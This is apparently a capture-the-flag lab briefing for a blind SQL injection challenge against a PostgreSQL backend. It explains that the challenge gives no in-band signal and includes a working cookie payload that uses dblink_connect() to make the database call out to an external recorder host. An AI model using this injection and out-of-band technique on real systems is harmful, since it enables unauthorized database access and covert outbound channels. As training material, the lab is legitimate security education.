Lab briefing: the site looks up the TrackingId cookie against a tracked_users table. The query result is never reflected, any SQL error is swallowed, and there is no timing gate - so the response body is byte-identical regardless of what the payload does. There is no in-band signal at all.

To solve, pivot the database into an out-of-band connection. The backend is PostgreSQL with the dblink extension enabled, and an OOB recorder is running on {{ oob_hostname }}:5432 on the compose network. An injected dblink_connect() forces Postgres to open a TCP connection to that host, e.g.

TrackingId=x'||(SELECT dblink_connect('host={{ oob_hostname }} port=5432 user=x password=x dbname=x'))||'

As soon as the recorder captures at least one inbound connection, this page releases the flag.
